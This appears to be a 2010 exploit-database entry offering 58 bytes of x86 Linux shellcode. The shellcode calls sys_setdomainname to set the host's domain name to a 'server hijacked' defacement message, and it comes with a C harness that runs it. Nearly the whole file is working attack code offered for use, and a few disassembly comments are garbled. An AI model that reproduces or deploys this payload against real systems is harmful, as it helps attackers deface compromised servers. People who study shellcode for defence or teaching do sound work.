/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : setdomainname to "th1s s3rv3r h4s b33n h1j4ck3d !!"
Name   : 58 bytes sys_setdomainname ("th1s s3rv3r h4s b33n h1j4ck3d !!") x86 linux shellcode
Date   : Wed Jun  2 19:57:34 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
greetz to : flyff666, mywisdom, kiddies, petimati, ketek, whitehat, and all devilzc0de family
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x13"                    /* jmp    0x8048075 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x79"                    /* mov    $0x79,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\xb1\x20"                    /* mov    $0x20,%cl */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
		"\x74\x68"                    /* je     0x80480e4 */
		"\x31\x73\x20"                /* xor    %esi,0x20(%ebx) */
		"\x73\x33"                    /* jae    0x80480b4 */
		"\x72\x76"                    /* jb     0x80480f9 */
		"\x33\x72\x20"                /* xor    0x20(%edx),%esi */
		"\x68\x34\x73\x20\x62"        /* push   $0x62207334 */
		"\x33\x33"                    /* xor    (%ebx),%esi */
		"\x6e"                        /* outsb  %ds		"(%esi),(%dx) */
		"\x20\x68\x31"                /* and    %ch,0x31(%eax) */
		"\x6a\x34"                    /* push   $0x34 */
		"\x63\x6b\x33"                /* arpl   %bp,0x33(%ebx) */
		"\x64\x20\x21"                /* and    %ah,%fs		"(%ecx) */
		"\x21";                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}